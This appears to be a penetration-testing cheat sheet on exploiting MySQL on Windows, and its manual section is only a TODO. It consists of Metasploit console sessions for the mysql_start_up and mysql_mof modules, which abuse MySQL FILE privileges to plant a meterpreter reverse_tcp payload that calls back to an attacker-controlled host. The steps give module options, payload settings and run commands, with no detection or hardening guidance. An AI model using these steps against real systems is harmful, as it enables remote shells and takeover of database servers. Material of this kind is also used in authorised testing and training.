# MySQL

## 01 - Manual

TODO: Replicate the methods by performing manual exploitation that is done in MySQL

## 02 - Metasploit

### 2.1 - Abusing MySQL FILE Privileges to execute a callback Shell via Windows Startup

```
msf > use exploit/windows/mysql/mysql_start_up

msf exploit(windows/mysql/mysql_start_up) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/mysql/mysql_start_up) > options

Module options (exploit/windows/mysql/mysql_start_up):

   Name            Current Setting                                              Required  Description
   ----            ---------------                                              --------  -----------
   PASSWORD                                                                     yes       The password to authenticate with
   RHOSTS                                                                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT           3306                                                         yes       The target port (TCP)
   STARTUP_FOLDER  /programdata/microsoft/windows/start menu/programs/startup/  yes       The All Users Start Up folder
   USERNAME                                                                     yes       The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   MySQL on Windows


msf exploit(windows/mysql/mysql_start_up) > set lhost <attacker_IP>

msf exploit(windows/mysql/mysql_start_up) > set lport <listener_PORT>

msf exploit(windows/mysql/mysql_start_up) > set disablepayloadhandler false

msf exploit(windows/mysql/mysql_start_up) > set rhosts <IP>

msf exploit(windows/mysql/mysql_start_up) > set startup_folder <windows_startup_folder_destination>

msf exploit(windows/mysql/mysql_start_up) > set username <username>

msf exploit(windows/mysql/mysql_start_up) > set password <password>

msf exploit(windows/mysql/mysql_start_up) > run
```

### 2.2 - Abusing MySQL FILE Privileges to execute a callback Shell via Windows MOF file

```
msf > use exploit/windows/mysql/mysql_mof

msf exploit(windows/mysql/mysql_mof) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/mysql/mysql_mof) > options

Module options (exploit/windows/mysql/mysql_mof):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       The password to authenticate with
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     3306             yes       The target port (TCP)
   USERNAME                   yes       The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   MySQL on Windows prior to Vista

msf exploit(windows/mysql/mysql_mof) > set lhost <attacker_IP>

msf exploit(windows/mysql/mysql_mof) > set lport <listener_PORT>

msf exploit(windows/mysql/mysql_mof) > set rhosts <target_IP>

msf exploit(windows/mysql/mysql_mof) > set username <username>

msf exploit(windows/mysql/mysql_mof) > set password <password>

msf exploit(windows/mysql/mysql_mof) > run
```